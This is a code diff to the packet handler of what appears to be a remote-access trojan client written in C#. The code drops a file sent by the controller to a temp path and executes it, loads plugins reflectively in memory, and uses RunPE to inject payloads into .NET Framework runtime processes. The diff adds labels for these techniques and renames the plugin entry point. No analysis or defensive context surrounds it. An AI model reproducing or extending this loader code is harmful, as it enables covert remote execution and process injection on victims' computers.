@@ -14,6 +14,7 @@ namespace Client.Handle_Packet
         {
             try
             {
+                //Drop To Disk
                 string fullPath = Path.GetTempFileName() + unpack_msgpack.ForcePathObject("Extension").AsString;
                 unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
                 Process.Start(fullPath);
@@ -37,6 +38,7 @@ namespace Client.Handle_Packet
                 byte[] plugin = unpack_msgpack.ForcePathObject("Plugin").GetAsBytes();
                 if (injection.Length == 0)
                 {
+                    //Reflection
                     new Thread(delegate ()
                     {
                         try
@@ -59,12 +61,13 @@ namespace Client.Handle_Packet
                 }
                 else
                 {
+                    //RunPE
                     new Thread(delegate ()
                     {
                         try
                         {
                             Assembly loader = Assembly.Load(plugin);
-                            MethodInfo meth = loader.GetType("Plugin.Program").GetMethod("Run");
+                            MethodInfo meth = loader.GetType("Plugin.Plugin").GetMethod("Initialize");
                             meth.Invoke(null, new object[] { buffer, Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), injection) });
                         }
                         catch (Exception ex)
